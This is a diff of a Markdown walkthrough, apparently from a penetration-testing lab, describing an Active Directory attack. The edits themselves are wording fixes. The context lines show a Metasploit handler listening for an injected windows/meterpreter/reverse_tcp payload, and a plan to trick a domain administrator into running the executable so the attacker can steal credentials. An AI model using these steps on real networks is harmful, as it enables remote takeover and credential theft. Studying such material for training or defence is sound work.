@@ -169,8 +169,8 @@ To open a remote desktop connection, we use the following command:
 	Doing so, all the account of the organization will be able to see (and execute) that file.
 	
  7. **Run the reverse shell server:**
-	For allowing us to take control of a machine, we obviously need to start the reverse shell server on our Kali Linux machine.
-	For doing so, we launch the following command:
+	For allowing us to take control of a machine, we need to start the reverse shell server on our Kali machine.
+	For doing so, we execute the following command:
 	
 	`msfconsole -r ./Desktop/meterpreter.rc`
 	
@@ -183,7 +183,7 @@ To open a remote desktop connection, we use the following command:
 	set ExitOnSession false
 	exploit -j -z
 	```
-	The script, basically, starts a generic payload handler and makes it listening on the default port of the current machine for incoming connections from a `windows/meterpreter/reverse_tcp` payload, which is the one that we have injected.
+	The script, basically, starts a generic payload handler and makes it listen on the default port of the current machine for incoming connections from a `windows/meterpreter/reverse_tcp` payload, which is the one that we have injected.
 	
  8. **"Convince" a Domain Administrator to run the executable:**
 	In order to make this whole system effectively work, we need to "convince" a domain administrator to run the executable: doing so, we will be able to communicate to a process (the reverse shell client) running with high-privileges (remember: all domain administrators are also local administrators), so we will be able to **steal the credentials** of the logged account.
@@ -231,11 +231,11 @@ To open a remote desktop connection, we use the following command:
 
 hhhh
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE0MjgwOTQyODksMjA0MTM1ODI0NCwtOD
-kwODI5MjYyLDE0MTQ2MTk3MDQsLTExMTAxNzg5NzMsLTYwMDQx
-OTEzMCw5MjczMDExNTYsLTY3MTU1MzEwMCwxMjM5MzYyNjcwLD
-ExMTY1MjUzOCwxNjk5NTEwMzcyLDU1MTIwNzk3MCwtMTYyNzM5
-MTI0MSwtMzMxNTc0MjcwLC0xNzA3NTg3MTUwLDE2MjMxMTM1OT
-EsNzQxNzUxNTA5LDE2OTUyMDAyNjgsMTYyOTQ1Mzk5MSwxMzI4
-NjI3NzZdfQ==
+eyJoaXN0b3J5IjpbLTc5Mzc0ODQ2OSwyMDQxMzU4MjQ0LC04OT
+A4MjkyNjIsMTQxNDYxOTcwNCwtMTExMDE3ODk3MywtNjAwNDE5
+MTMwLDkyNzMwMTE1NiwtNjcxNTUzMTAwLDEyMzkzNjI2NzAsMT
+ExNjUyNTM4LDE2OTk1MTAzNzIsNTUxMjA3OTcwLC0xNjI3Mzkx
+MjQxLC0zMzE1NzQyNzAsLTE3MDc1ODcxNTAsMTYyMzExMzU5MS
+w3NDE3NTE1MDksMTY5NTIwMDI2OCwxNjI5NDUzOTkxLDEzMjg2
+Mjc3Nl19
 -->
